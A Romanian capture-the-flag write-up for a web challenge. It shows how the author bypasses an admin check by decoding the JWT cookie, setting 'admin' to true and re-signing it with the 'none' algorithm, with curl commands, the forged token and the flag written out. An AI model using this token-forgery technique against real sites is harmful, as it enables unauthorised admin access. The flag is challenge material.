Problema ne spune daca suntem administrator, si observam o adresa de ip impreuna cu un port: 
                                     
                                 34.185.167.212:32394


Rezolvare:

Sa putem rezolva aceasta problema, e sa accesam adresa si sa vedem ce ne afiseaza, 
Observam ca e un site video cu o pisica plutind  prin aer, si cateva informati dar vedem ca avem un buton 
mai jos care scrie *Reveal secret*, il accesam si vedem: 
                              
                                            Ya' cookie tells me you're not an admin.

si cu adresa care duce la un alt folder precum: 

                                                  /secret.php

1. vedem ca cooki-ul ne spune ca nu suntem admin, e sa analizam putin site-ul

2. folosim aceasta comanda:
 
                                                  curl http://34.185.167.212:32394/secret.php
Ne afiseaza: 
 
                                                    Ya' cookie tells me you're not an admin.

3. folosind comanda:
    
                                                curl -I http://34.185.167.212:32394/secret.php

Ne afiseaza:             

                                                          HTTP/1.1 200 OK
                                                          Date: Fri, 21 Nov 2025 06:50:07 GMT
                                                          Server: Apache
                                                          Set-Cookie: secret=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.k2RUNg6FlRlfDjQUAQmDzPLrzZL0_sarBgiWtNr4cpE; expires=Fri, 21-Nov-2025 06:55:07 GMT; Max-Age=300; path=/
                                                          Content-Type: text/html; charset=UTF-8


vazand ca la Set-Cookie: 
 
                                                secret=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.k2RUNg6FlRlfDjQUAQmDzPLr>

4. Decodam acel cod secret pe site-ul Cyberchef si vedem ca ne decodeaza in JWT Decode:
                            
                                                       {
                                                                  "admin": false
                                                       }

5. vedem ca ne spune: 
 
                                                           admin: false

Sa fie pe optiunea True, e sa modificam acest cod secret

6. Sa putem modifica, accesam site-ul *https://fusionauth.io/dev-tools/jwt-decoder* si sa inseram ce continea: 
                      
                                                       eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.k2RUNg6FlRlfDjQUAQmDzPLrzZL0_sarBgiWtNr4cpE

observam ca pe partea de jos la payload ne afiseaza cum ne-a afisat atunci cand l-am decodificat
si in loc de fals introducem true si observam ca sa remodificat token-ul, il copiem si intram pe site-ul jwt.io si introducem acolo


7. Observam ca dupa ce am introdus, ne afiseaza ca ne da erroare la signature, asa ca
pe partea de sus dreapta apasam pe Generate Example, si alegem None, vedem ca sa remodificat token-ul

                                                     eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTczNjI5MjEyNH0.

8. Ne ducem pe site-ul respectiv, dam pe inspecteaza, si intram pe Application, stergem token-ul cel vechi si introducem pe cel nou, dam un refres si ne afiseaza flag-ul: 

                                                                        Hi admin! Here's ya' flag: 
                                                             CTF{98ed1dfbddd3510841eb99916a6a7534f224f5ae9841758708046540237987}

___                                   
FLAG GASIT: CTF{98ed1dfbddd3510841eb99916a6a7534f224f5ae9841758708046540237987}
___

Succes !!! :)))

                             
